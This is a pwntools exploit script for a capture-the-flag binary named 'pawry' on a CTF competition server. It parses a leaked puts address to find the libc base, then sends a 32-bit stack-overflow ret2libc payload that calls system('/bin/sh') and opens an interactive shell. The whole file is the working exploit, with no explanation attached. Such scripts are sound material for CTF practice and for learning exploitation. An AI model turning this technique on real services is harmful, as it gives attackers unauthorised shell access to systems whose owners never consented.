from pwn import *

exe_file="./pawry"
server="chall.codefest.tech"
port="8686"
# libc_file="./libc.so"
libc = ELF("./libc.so")
ld = ELF("./ld-2.31.so")

exe = ELF(exe_file,0)
# libc = ELF(libc_file,0) 

context.binary = exe
# context.terminal = []

def conn():
	if args.LOCAL:
		return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
	else:
		return remote(server,port)

def attach(r,gdbscript):
	if type(r) == process:
		gdb.attach(r,gdbscript)

def exploit():
	r.recvuntil("address hai : ")
	tmp = r.recvline()
	puts_leak = int(tmp.strip().encode('hex').replace("1b5b33383b353b38336d3078","").replace("1b5b306d","").decode('hex'),16)
	print(hex(puts_leak))

	puts_libc = libc.sym['puts']
	libc.address = puts_leak - puts_libc
	
	binsh = next(libc.search("/bin/sh"))
	system = libc.sym["system"]
	exit = libc.sym["exit"]
	
	log.info("Libc Base : "+hex(libc.address))	

	payload = "A"*0x18
	payload += "A"*0x4
	payload += p32(system)
	payload += p32(exit)
	payload += p32(binsh)
	
	r.sendline(payload)
	

if __name__ == "__main__":
	r = conn()
	exploit()
	r.interactive()